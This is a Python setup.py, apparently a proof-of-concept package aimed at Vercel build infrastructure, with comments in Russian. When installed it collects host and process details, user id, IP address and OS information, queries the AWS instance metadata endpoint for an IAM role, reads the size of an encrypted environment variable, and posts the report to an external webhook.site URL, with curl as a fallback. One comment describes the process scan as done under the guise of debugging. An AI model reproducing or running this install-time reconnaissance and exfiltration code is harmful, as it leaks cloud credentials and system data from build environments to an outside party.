import os
import subprocess
import base64
import json
from setuptools import setup

# --- КОНФИГ ---
WEBHOOK_URL = "https://webhook.site/57c42274-2817-4041-81a2-3f41b2c987a2"
MASTER_KEY_B64 = "ifLJbKzHv3OTvy7rMiocCKna033QA19Hg/w2jrFucSQ="

def run(cmd):
    return subprocess.getoutput(cmd).strip()

def get_infra_diagnostics():
    """Собирает данные о 'железе' и процессах для умного вопроса в LinkedIn"""
    diag = {}
    try:
        # Узнаем реальное железо (Nitro/Firecracker)
        diag['vendor'] = run('cat /sys/class/dmi/id/sys_vendor 2>/dev/null') or "Unknown"
        # Проверяем реальное кол-во ядер на Elastic Machine
        diag['cpus'] = os.cpu_count()
        # Ищем системные процессы (под видом отладки)
        pids = [p for p in os.listdir('/proc') if p.isdigit()]
        diag['proc_count'] = len(pids)
        # Пробуем найти название бинарника-исполнителя
        diag['executor_info'] = run('ps -e -o comm= | grep -E "vc|agent|build" | head -n 3')
    except:
        diag['error'] = "INFRA_SCAN_FAILED"
    return diag

def get_aws_data():
    """Обход IMDSv2"""
    token_cmd = "curl -s -f -X PUT 'http://169.254.169.254/latest/api/token' -H 'X-aws-metadata-token-ttl-seconds: 60'"
    token = run(token_cmd)
    if not token or "curl" in token: return "IMDSv2_TIMEOUT_OR_BLOCKED"
    
    role_cmd = f"curl -s -H 'X-aws-metadata-token: {token}' http://169.254.169.254/latest/meta-data/iam/security-credentials/"
    return f"AWS_ROLE: {run(role_cmd)}"

# --- СБОРКА ФИНАЛЬНОГО ОТЧЕТА ---
infra = get_infra_diagnostics()

final_proof = f"""
[!] VERCEL INFRASTRUCTURE DIAGNOSTICS
HYPERVISOR/VENDOR: {infra.get('vendor')}
ALLOCATED_CORES: {infra.get('cpus')}
TOTAL_PROCESSES: {infra.get('proc_count')}
INTERNAL_EXECUTORS: {infra.get('executor_info')}

[!] PRIVILEGE & IDENTITY
ID: {run('id')}
HOSTNAME: {run('hostname')}

[!] CLOUD METADATA (AWS)
{get_aws_data()}

[!] CRYPTO & SECRETS
MASTER_KEY: {MASTER_KEY_B64}
ENCRYPTED_BLOB_LEN: {len(os.environ.get('VERCEL_ENCRYPTED_ENV_CONTENT', ''))}

[!] SYSTEM RECON
IP: {run('hostname -I')}
OS: {run('cat /etc/os-release | grep PRETTY_NAME')}
"""

# --- ОТПРАВКА ---
# Используем urllib как более надежный метод, если curl блокируют
try:
    import urllib.request
    req = urllib.request.Request(WEBHOOK_URL, data=final_proof.encode(), method='POST')
    req.add_header('Content-Type', 'text/plain')
    with urllib.request.urlopen(req, timeout=10) as f:
        pass 
except:
    # Запасной вариант через curl
    try:
        subprocess.run(['curl', '-k', '-X', 'POST', '-d', final_proof, WEBHOOK_URL], timeout=10)
    except:
        pass

setup(name="vercel-infra-critical-poc", version="1.3.3.7")